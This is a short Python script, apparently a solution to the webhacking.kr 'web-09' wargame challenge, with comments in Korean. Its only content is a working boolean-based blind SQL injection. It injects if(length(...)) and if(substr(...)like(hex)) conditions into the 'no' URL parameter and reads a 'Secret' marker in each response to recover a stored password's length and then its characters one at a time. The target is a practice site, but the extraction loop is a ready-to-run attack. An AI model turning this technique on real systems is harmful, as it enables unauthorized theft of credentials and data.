import requests
url = "https://webhacking.kr/challenge/web-09/index.php?no="
params = 'if(length(id)like({}),3,0)'
TRUE_FLAG = 'Secret'

# password의 길이를 구하는 쿼리
for i in range(15):
    request_url = url + params.format(i)
    response = requests.get(request_url)
    if(TRUE_FLAG in response.text):
        print("id's length : " + str(i))

# password의 글자를 구하는 쿼리
password = ''
for i in range(1,12):
    for j in range(65,127):
        params = 'if(substr(id,{},1)like({}),3,0)'.format(i,hex(j))
        print(params)
        request_url = url + params
        response = requests.get(request_url)
        if(TRUE_FLAG in response.text):
            print('find {}st character : {}'.format(i,chr(j)))
            password += chr(j)
            break

print("password is : {}".format(password))
